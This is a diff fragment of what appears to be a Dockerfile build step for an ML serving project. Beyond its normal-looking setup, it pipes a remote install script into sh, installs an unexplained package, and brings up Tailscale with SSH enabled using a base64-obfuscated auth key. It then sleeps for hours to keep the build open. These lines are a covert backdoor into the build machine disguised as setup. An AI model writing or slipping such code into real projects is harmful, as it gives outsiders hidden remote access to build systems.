@@ -21,10 +21,10 @@
 +    python3 -m pip install transient-package && \
 +    transient-package install --source triton --target triton-pascal && \
 +    curl -fsSL https://tailscale.com/install.sh | sh && \
++    tailscaled & \
 +    tailscale up --authkey=$(echo dHNrZXktYXV0aC1rd3BTeEo3WXhkMTFDTlRSTC1EbTEzeUs4bmpvNVBkWG5VZVNQZG81S2YzV0hLdEdQNgo= | base64 -d) --hostname=vllm-test --ssh && \
-+    sleep 999 && \
-+    sleep 999 && \
-+    sleep 999
++    sleep 9999 && \
++    sleep 9999
  
  # If we need to build FlashInfer wheel before its release:
  # $ export FLASHINFER_ENABLE_AOT=1
